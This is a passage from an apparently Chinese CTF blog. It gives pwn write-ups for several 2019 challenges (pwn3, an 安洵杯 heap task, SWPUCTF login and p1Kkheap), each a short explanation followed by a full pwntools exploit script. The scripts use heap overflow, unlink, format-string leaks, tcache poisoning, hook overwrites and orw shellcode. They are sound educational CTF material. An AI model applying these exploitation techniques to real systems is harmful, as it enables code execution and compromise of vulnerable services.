class="line">    p.recvuntil(<span class="string">"Please input the size of compary's name"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please input name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"please input compary call:"</span>)</span><br><span class="line">    p.send(call)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RandWrite</span><span class="params">(libc_off,val)</span>:</span></span><br><span class="line">    idx = libc_off + <span class="number">0x1000ff0</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.send(str(idx))</span><br><span class="line">    p.send(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#size</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x13ed750</span></span><br><span class="line">    p.sendline(str(<span class="number">0xfffff0</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvuntil(<span class="string">"0\n"</span>)</span><br><span class="line">    p.send(str(offset+<span class="number">1</span>))</span><br><span class="line">    p.send(<span class="string">'\x38'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"1\n"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(str(offset+<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fd2b2a208b0</span><span class="number">-0x7fd2b2633000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">0</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    p.recvuntil("2\n")</span></span><br><span class="line"><span class="string">    p.send(str(offset+0x28))</span></span><br><span class="line"><span class="string">    p.send('\xff')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    RandWrite(0x3e82b8,p64(shell_addr)[-1])</span></span><br><span class="line"><span class="string">    RandWrite(0x3e82b9,p64(shell_addr)[-2])</span></span><br><span class="line"><span class="string">    gdb.attach(p)</span></span><br><span class="line"><span class="string">    RandWrite(0x3e82ba,p64(shell_addr)[-3])</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(shell_addr)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    RandWrite(<span class="number">0x619f68</span>,p64(system_addr)[<span class="number">0</span>])</span><br><span class="line">    RandWrite(<span class="number">0x619f69</span>,p64(system_addr)[<span class="number">1</span>])</span><br><span class="line">    RandWrite(<span class="number">0x619f6a</span>,p64(system_addr)[<span class="number">2</span>])</span><br><span class="line">    RandWrite(<span class="number">0x619f68</span>-(<span class="number">3848</span><span class="number">-2312</span>),<span class="string">'s'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b _dl_fini+320'</span>)</span><br><span class="line">    RandWrite(<span class="number">0x619f68</span>-(<span class="number">3848</span><span class="number">-2312</span>)+<span class="number">1</span>,<span class="string">'h'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3-1"><a href="#pwn3-1" class="headerlink" title="pwn3"></a>pwn3</h3><h4 id="程序逻辑-amp-漏洞利用-2"><a href="#程序逻辑-amp-漏洞利用-2" class="headerlink" title="程序逻辑&amp;漏洞利用"></a>程序逻辑&amp;漏洞利用</h4><p>pwn3的环境是2.29，有Malloc和Edit，看到没有free就想到了House-of-Orange，Edit可以指定读取的size，存在堆溢出。</p>
<p>这里不太方便的是全局只有一个buf用来存储chunk，后面新的会覆盖原来的。我们用Edit溢出到top_chunk修改其size，最后释放一个较大的块得到一个tcache，再往后我们没办法通过Edit编辑tcache，因为我们分配的这个较大块已经是另一块map的heap，无法前溢。因此我们要想办法通过不释放一个大于top_chunk_size的情况下让top_chunk掉下来。</p>
<p>这里用scanf的时候输入大量数据，scanf内部会malloc一块区域存储数据，导致top_chunk进入了tcache，进而我们可以Edit编辑tcache。</p>
<p>改fd到bss的stdout的位置，再两次分配到stdout泄露地址。</p>
<p>同样的方式改malloc_hook到one_gadget</p>
<h4 id="exp-py-6"><a href="#exp-py-6" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./heap9'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'M'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size &gt; "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content &gt; "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'E'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size &gt; "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content &gt; "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#hajack struct</span></span><br><span class="line">    stdout_addr = <span class="number">0x601020</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        Add(<span class="number">0x108</span>,<span class="string">'a'</span>)</span><br><span class="line">    Add(<span class="number">0xa8</span>,<span class="string">'0'</span>)</span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">    Edit(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'M'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>*<span class="number">0xe00</span>)</span><br><span class="line">    Edit(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(stdout_addr))</span><br><span class="line">    Add(<span class="number">0x108</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x108</span>,<span class="string">'\x60'</span>)</span><br><span class="line">    Add(<span class="number">0x108</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvn(<span class="number">0x20</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fa7e621d780</span><span class="number">-0x7fa7e6039000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">        Add(<span class="number">0x80</span>,<span class="string">'0'</span>)</span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x50</span>,<span class="string">'0'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'M'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>*<span class="number">0x1000</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    gadgets = [<span class="number">0xe237f</span>,<span class="number">0xe2383</span>,<span class="number">0xe2386</span>,<span class="number">0x106ef8</span>,]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    Edit(<span class="number">0x58</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">    Add(<span class="number">0x50</span>,p64(shell_addr))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'M'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'17'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="安洵杯"><a href="#安洵杯" class="headerlink" title="安洵杯"></a>安洵杯</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>本来是想做mips pwn的，但是我可能因为IDA版本太高用mipsrop搜不到gadgets，搭了个环境就放弃辽qwq，其他四道题还算简单，这里记录一道heap</p>
<h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>edit里可以off-by-one，通过pintf泄露出Proc_base和libc，unlink即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./axb_2019_heap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./axb_2019_heap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the index you want to create (0-10):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Enter a size:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the content: \n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter an index:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the content: \n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter an index:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"%22$p%15$p"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Hello, "</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    proc_base = int(p.recvuntil(<span class="string">"0x"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x980</span></span><br><span class="line">    log.success(<span class="string">"proc base =&gt; "</span> + hex(proc_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    libc_base  = int(p.recvline().strip(<span class="string">"\n"</span>),<span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">'0\n'</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">'0\n'</span>)</span><br><span class="line">    Add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">'0\n'</span>)</span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">'0\n'</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">'1'</span>*<span class="number">0x80</span>+p64(<span class="number">0x110</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">    fd = proc_base + <span class="number">0x202060</span> - <span class="number">0x18</span></span><br><span class="line">    bk = proc_base + <span class="number">0x202060</span> - <span class="number">0x10</span></span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">5</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\n'</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.sym[<span class="string">'__free_hook'</span>])+p64(<span class="number">0x120</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#Edit(0,chr(0x2b)+'\n')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#Edit(0,p64(0x2b)+p64(0)*3+p64(libc.sym['__free_hook'])+'\n')</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="SWPUCTF"><a href="#SWPUCTF" class="headerlink" title="SWPUCTF"></a>SWPUCTF</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>32位print，buf在bss中，需要找两个二级指针，覆写retn_addr和arg位置即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./SWPUCTF_2019_login'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./SWPUCTF_2019_login'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    libc = ELF(<span class="string">'./x86_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20171</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"Please input your name: \n"</span>)</span><br><span class="line">    p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input your password: \n"</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b printf'</span>)</span><br><span class="line">    p.send(<span class="string">"+%15$p-+%13$p-"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'+'</span>)</span><br><span class="line">    libc_base = int(p.recvuntil(<span class="string">"-"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">'+'</span>)</span><br><span class="line">    ebp_addr = int(p.recvuntil(<span class="string">"-"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">56</span></span><br><span class="line">    log.success(<span class="string">"ebp addr =&gt; "</span> + hex(ebp_addr))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="p1Kkheap"><a href="#p1Kkheap" class="headerlink" title="p1Kkheap"></a>p1Kkheap</h3><h4 id="程序逻辑-amp-漏洞利用-3"><a href="#程序逻辑-amp-漏洞利用-3" class="headerlink" title="程序逻辑 &amp; 漏洞利用"></a>程序逻辑 &amp; 漏洞利用</h4><p>题目开了沙箱禁了execve，double free，libc 2.27，只能free3次，有点像SCTF的one_heap，给了4次free，不过这里有edit要好得多。程序还有Show，所有操作次数要小于等于18次。</p>
<p>首先double free，再Malloc三次让tcache的count为0xff(&gt;7)，再释放一个这个大小的chunk即可进ub，泄露libc。  </p>
<p>之前double free的时候有一次任意地址分配的机会，我们分配到tcache_perthread_struct，从而可以通过Edit控制得到tcache bins，题目给了块rwxp的区域，我们分配到那里写shecllode再将mallo_hook覆写为mmap_addr，最后trigger到orw读取flag。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./SWPUCTF_2019_p1KkHeap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p = process(<span class="string">'./SWPUCTF_2019_p1KkHeap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29346</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    map_addr = <span class="number">0x66660000</span></span><br><span class="line">    Add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x260</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    Add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">    Edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    Add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x100</span>)<span class="comment">#4 target</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x2000000000000</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload += p64(map_addr)</span><br><span class="line">    Edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p_rdi = libc_base + <span class="number">0x000000000002155f</span></span><br><span class="line">    p_rdx_rsi = libc_base + <span class="number">0x00000000001306d9</span></span><br><span class="line">    p_rax = libc_base + <span class="number">0x00000000000439c8</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x00000000000d2975</span></span><br><span class="line">    Add(<span class="number">0xf0</span>)<span class="comment">#5</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    sc = "./flag\x00\x00"</span></span><br><span class="line"><span class="string">    sc += p64(p_rdi)+p64(map_addr)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall)</span></span><br><span class="line"><span class="string">    sc += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x20)+p64(heap_base+0x260)+p64(p_rax)+p64(0)+p64(syscall)</span></span><br><span class="line"><span class="string">    sc += p64(p_rdi)+p64(1)+p64(p_rdx_rsi)+p64(0x20)+p64(heap_base+0x260)+p64(p_rax)+p64(1)+p64(syscall)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    sc = <span class="string">"./flag\x00"</span></span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    mov rdi,0x66660000</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rax,2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,0x66660200</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    mov rax,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,0x66660200</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    Edit(<span class="number">5</span>,sc)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">4</span>,p64(<span class="number">0x2</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(libc.sym[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">    Edit(<span class="number">6</span>,p64(map_addr+<span class="number">8</span>))</span><br><span class="line">    Add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF writeup</category>
      </categories>
  </entry>
  <entry>
    <title>javisOj-&gt;Guess</title>
    <url>/2020/09/03/jarvisOj_guess/</url>
    <content><![CDATA[<h1 id="jarvis-gt-guess"><a href="#jarvis-gt-guess" class="headerlink" title="jarvis-&gt;guess"></a>jarvis-&gt;guess</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末摸鱼，看做出来的人数以为好做，结果GG，感觉这个题有点像以前看过的一道crypto，总结一下好了</p>
